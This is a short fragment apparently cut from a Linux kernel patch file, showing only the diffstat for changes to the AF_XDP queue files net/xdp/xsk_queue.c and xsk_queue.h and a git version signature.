+ net/xdp/xsk_queue.c | 8 ++++++++
+ net/xdp/xsk_queue.h | 4 +++-
+ 2 files changed, 11 insertions(+), 1 deletion(-)
+
+-- 
+2.43.0
+
